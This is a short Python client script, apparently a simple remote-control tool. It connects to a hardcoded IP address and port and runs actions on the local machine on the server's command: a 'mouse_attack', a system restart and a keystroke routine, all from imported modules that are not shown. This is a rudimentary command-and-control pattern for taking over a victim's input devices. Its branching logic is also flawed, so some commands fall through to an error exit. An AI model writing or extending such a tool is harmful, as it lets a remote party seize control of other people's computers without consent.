import socket
import MouseControl , KeyStrokes , Restart

def start_client():
    # Create a socket object
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Define server IP address and port
    host = '198.168.0.179'
    port = 12310
    
    # Connect to the server
    client_socket.connect((host, port))
    server_message = client_socket.recv(1024).decode('utf-8')
    print(server_message)
   
    while True:
        
        # Send a message to the server
        client_message = input("Client: ")
        client_socket.send(client_message.encode('utf-8'))
        
        if client_message.lower() == 'exit':
            print("Closing connection")
            break
        
        # Receive response from the server
        server_message = client_socket.recv(1024).decode('utf-8')
        if server_message.lower() == 'exit':
            print("Server closed the connection")
            break
        
        if server_message == '1':
            MouseControl.mouse_attack()
        
        if server_message == '2':
            Restart.restart()
        
        if server_message == '3':
            KeyStrokes.KeyStrokes()
        
        else:
            print("invalid value")
            return 1
        print(f"Server: {server_message}")

    # Close the client socket
    client_socket.close()

if __name__ == "__main__":
    start_client()